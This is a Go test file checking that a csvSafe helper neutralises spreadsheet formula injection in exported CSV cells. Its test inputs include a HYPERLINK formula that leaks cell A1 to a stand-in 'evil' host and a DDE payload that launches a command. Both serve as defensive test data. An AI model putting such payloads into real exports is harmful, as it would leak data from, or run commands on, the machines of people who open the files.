package handler

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"
)

// P4-2: exported CSV cells must never start with a formula trigger.
func TestCSVSafe_NeutralisesFormulaPrefixes(t *testing.T) {
	cases := map[string]string{
		`=HYPERLINK("https://evil/?"&A1,"x")`: `'=HYPERLINK("https://evil/?"&A1,"x")`,
		`+1+1`:                                `'+1+1`,
		`-2+3`:                                `'-2+3`,
		`@SUM(A1)`:                            `'@SUM(A1)`,
		"\t=1+1":                              "'\t=1+1",
		"\r=1+1":                              "'\r=1+1",
		"  =cmd|'/C calc'!A0":                 "'  =cmd|'/C calc'!A0", // leading spaces are trimmed by spreadsheets
		`alice@example.com`:                   `alice@example.com`,    // '@' inside is fine
		`My App`:                              `My App`,
		`203.0.113.9`:                         `203.0.113.9`,
		``:                                    ``,
		`   `:                                 `   `,
	}
	for in, want := range cases {
		if got := csvSafe(in); got != want {
			t.Errorf("csvSafe(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCSVSafe_SurvivesCSVQuoting(t *testing.T) {
	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	_ = w.Write([]string{csvSafe(`=1+1`), csvSafe(`a,b`)})
	w.Flush()
	line := strings.TrimSpace(buf.String())
	if !strings.HasPrefix(line, `'=1+1,`) {
		t.Fatalf("first cell must be text-prefixed after csv quoting: %q", line)
	}
}
